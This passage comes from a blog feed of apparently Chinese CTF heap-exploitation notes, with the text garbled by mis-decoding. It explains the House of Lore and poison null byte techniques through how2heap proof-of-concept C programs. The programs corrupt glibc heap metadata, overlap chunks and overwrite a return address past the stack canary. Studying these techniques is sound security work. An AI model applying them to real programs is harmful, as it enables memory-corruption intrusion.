class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br> size in order to have the absolute address of the chunk<br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¸ºç»•è¿‡æ£€æŸ¥å¸ƒå±€ï¼Œå®ç°æ•ˆæœä¸ºmallocåˆ°buffer1<img src="/2023/02/05/house-of-lore/1-1.jpg" class title="æ­¥éª¤ä¸€"></li><li>victimè¿›å…¥small bin<img src="/2023/02/05/house-of-lore/1-2.jpg" class title="æ­¥éª¤äºŒ"></li><li>victim-&gt;bk&#x3D;buffer1ï¼Œå°†buffer1é“¾å…¥small bin<img src="/2023/02/05/house-of-lore/1-3.jpg" class title="æ­¥éª¤ä¸‰"></li><li>mallocå›victimï¼Œbuffer1-&gt;fd&#x3D;victimç»•è¿‡bck-&gt;fd&#x3D;&#x3D;victimçš„æ£€æŸ¥<img src="/2023/02/05/house-of-lore/1-4.jpg" class title="æ­¥éª¤å››"></li><li>mallocå›buffer1ï¼Œbuffer1-&gt;bk&#x3D;buffer2å’Œbuffer2-&gt;fd&#x3D;buffer1ç»•è¿‡bck-&gt;fd&#x3D;&#x3D;victimçš„æ£€æŸ¥</li><li>ä¹‹åæˆ‘ä»¬å°±èƒ½æ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€äº†</li></ul><h2 id="2-26ä»¥å"><a href="#2-26ä»¥å" class="headerlink" title="2.26ä»¥å"></a>2.26ä»¥å</h2><p>2.26åŠ å…¥tcacheæœºåˆ¶ä¹‹åï¼Œä»small binä¸­å–å‡ºä¸€ä¸ªchunkåä¼šæŠŠsmall binä¸­å‰©ä¸‹çš„chunkè£…å…¥tcacheç›´åˆ°è£…æ»¡ï¼Œæ”¾å…¥è¿‡ç¨‹æ²¡æœ‰ä»»ä½•æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//ä¼ªé€ ä»small binä¸­å–å‡ºchunkåå¡«æ»¡tcacheçš„chunk</span><br><br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br><span class="hljs-comment">//å¯ä»¥å°‘ä¸€æ­¥ä¼ªé€ buffer2çš„fd</span><br><br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(dummies[i]);<br><span class="hljs-comment">//å¡«æ»¡tcache</span><br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><span class="hljs-comment">//victimè¿›å…¥unsorted bin</span><br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><span class="hljs-comment">//victimè¿›å…¥small bin</span><br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <br><span class="hljs-comment">//fake6&lt;-fake5&lt;-â€¦â€¦&lt;-fake1&lt;-fake0&lt;-buffer2&lt;-buffer1&lt;-victim</span><br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//æ¸…ç©ºtcache</span><br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//mallocåˆ°victimï¼Œbuffer1ã€buffer2å’Œfake0â€”â€”fake4è¿›å…¥tcache</span><br><br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//ä»tcacheä¸­å–å‡ºbuffer1</span><br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å°±å¤šäº†ä¼ªé€ å¡«æ»¡tcacheçš„chunkçš„æ­¥éª¤</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2023/02/04/poison-null-byte/"/>
    <url>/2023/02/04/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰å­¦çš„æ—¶å€™æœ‰ç‚¹äº‘é‡Œé›¾é‡Œï¼Œç”»äº†ä¸€éå›¾è§‰å¾—æ¸…æ¥šå¤šäº†ï¼ˆæœç„¶ç¾æœ¯ç”Ÿå°±è¦ç”»å›¾(*ÏƒÂ´âˆ€&#96;)Ïƒï¼‰ï¼ˆä¾‹é¢˜åšçš„çœŸåç‰¢QAQï¼‰</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>å¦‚æœå¯¹è¾“å…¥é•¿åº¦æ£€æŸ¥ä¸ä¸¥ï¼Œå¯¼è‡´chunkä¸­å†…å®¹è¾“å…¥å¤šäº†ä¸€ä¸ªé›¶å­—èŠ‚æº¢å‡ºè‡³next chunkçš„sizeæœ€ä½ä½ï¼Œæ”¹å˜next chunkçš„sizeçš„å¤§å°<br>ä¸»è¦ä½œç”¨å°±æ˜¯æ”¹å˜next chunkçš„preinuseä½è§¦å‘åˆå¹¶å’Œé€ æˆå †å—é”™ä½</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-26ä»¥å‰"><a href="#2-26ä»¥å‰" class="headerlink" title="2.26ä»¥å‰"></a>2.26ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* c;<br><span class="hljs-type">uint8_t</span>* b1;<br><span class="hljs-type">uint8_t</span>* b2;<br><span class="hljs-type">uint8_t</span>* d;<br><span class="hljs-type">void</span> *barrier;<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-built_in">free</span>(b);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><ul><li>ä»¥ä¸‹æ­¥éª¤æ˜¯ä¸ºäº†æ§åˆ¶bçš„sizeï¼Œä¸ºä¹‹åcå‘ä¸‹åˆå¹¶åšå‡†å¤‡<img src="/2023/02/04/poison-null-byte/1.jpg" class title="æ­¥éª¤ä¸€"></li><li>åˆ†å‰²bæ˜¯ä¸ºäº†äº§ç”Ÿb1ä¼ªé€ ä¸€ä¸ªåœ¨unsorted binä¸­çš„pre chunkï¼Œé˜²æ­¢unlinkæŠ¥é”™ã€‚è§¦å‘cçš„å‘ä¸‹åˆå¹¶ï¼Œå†mallocå›æ¥cåæˆ‘ä»¬å°±èƒ½å®Œå…¨æ§åˆ¶b2<img src="/2023/02/04/poison-null-byte/2.jpg" class title="æ­¥éª¤äºŒ">psï¼šåƒæ˜¯å½¢æˆä¸€ä¸ªä¸‰æ˜æ²»ç»“æ„ï¼ˆäºŒä¸‰å±‚é—´å¾—æœ‰ä¸ªç¼ï¼‰ï¼Œç„¶åæ§åˆ¶ä¸­é—´çš„chunk<br>ppsï¼šç”³è¯·å¤§å°è¦å¤§äºfastbinçš„èŒƒå›´</li></ul><h2 id="2-26-2-28"><a href="#2-26-2-28" class="headerlink" title="2.26-2.28"></a>2.26-2.28</h2><p>æœ‰tcacheåæ³¨æ„ä¸¤ç‚¹ï¼š</p><ul><li>ç”³è¯·å¤§å°è¦å¤§äºtcacheçš„èŒƒå›´</li><li>heapæœ€å¼€å§‹ä¼šåˆ’åˆ†ä¸€ä¸ª0x290çš„chunkç»™tcacheï¼Œå› æ­¤è¦å…ˆç”³è¯·ä¸€ä¸ªpad chunkä½¿èµ·å§‹åœ°å€0x100å¯¹é½</li></ul><h2 id="2-28ä»¥å"><a href="#2-28ä»¥å" class="headerlink" title="2.28ä»¥å"></a>2.28ä»¥å</h2><p>2.29å¢åŠ äº†å¾ˆå¤šæ£€æŸ¥ï¼š</p><ul><li>_int_mallocå‡½æ•°çš„for(;;)å¾ªç¯ä¸­unsorted binéå†å¼€å¤´å¢åŠ next chunkçš„å¤§å°åˆæ³•æ€§æ£€æŸ¥ï¼Œåœ¨b2 &#x3D; malloc(0x80)æ—¶ä¼šæŠ¥é”™ï¼ˆè¿™ä¸ªå¯ä»¥ç»•è¿‡ï¼‰<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>_int_freeå‘ä¸‹åˆå¹¶æ—¶å¢åŠ pre chunkçš„sizeå’Œpresizeçš„æ£€æŸ¥ï¼Œåœ¨è§¦å‘cçš„å‘ä¸‹åˆå¹¶æ—¶ä¼šæŠ¥é”™<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br> malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></td></tr></table></figure>å› æ­¤æœ‰äº†å¦ä¸€ç§æ›´åŠ å¤æ‚çš„åˆ©ç”¨æ–¹æ³•ï¼Œå®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">void</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><span class="hljs-type">void</span> *heap_base = (<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)tmp &amp; (~<span class="hljs-number">0xfff</span>));<br><br><span class="hljs-type">size_t</span> size = <span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x20</span>;<br><span class="hljs-type">void</span> *padding= <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-comment">//å¸ƒç½®prevåœ°å€å¯¹é½0x1000 </span><br><br><span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-type">void</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(prev);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br><span class="hljs-type">void</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><br>assert(prev == prev2);<br><br>((<span class="hljs-type">long</span> *)prev)[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;<br>*(<span class="hljs-type">long</span> *)(prev + <span class="hljs-number">0x500</span>) = <span class="hljs-number">0x500</span>;<br><br><span class="hljs-type">void</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;  <span class="hljs-comment">// b-&gt;fd &lt;- fake_chunk</span><br><br><span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">free</span>(a2);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-type">void</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><br><span class="hljs-type">void</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span 